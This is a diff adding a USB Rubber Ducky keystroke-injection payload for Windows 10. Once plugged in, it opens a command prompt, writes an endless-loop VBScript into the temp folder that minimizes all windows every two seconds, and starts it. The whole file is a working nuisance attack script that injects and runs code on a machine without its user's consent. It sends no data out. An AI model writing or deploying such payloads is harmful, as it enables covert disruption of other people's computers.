@@ -1,0 +1,31 @@
+REM 	Author: LyQuid
+REM 	Description: Minimizing all windows within specific time
+REM 	Target: Windows 10
+
+DELAY 1000
+GUI r
+DELAY 200
+STRING cmd
+ENTER
+DELAY 500
+
+STRING del %tmp%\minimze.vbs
+ENTER
+
+STRING cd %tmp% && copy con minimze.vbs
+ENTER
+STRING do
+ENTER
+STRING set oShellApp = CreateObject("Shell.Application")
+ENTER
+STRING oShellApp.MinimizeAll
+ENTER
+STRING WScript.Sleep 2000
+ENTER
+STRING loop
+ENTER
+CTRL z
+ENTER
+
+STRING start minimze.vbs && exit
+ENTER
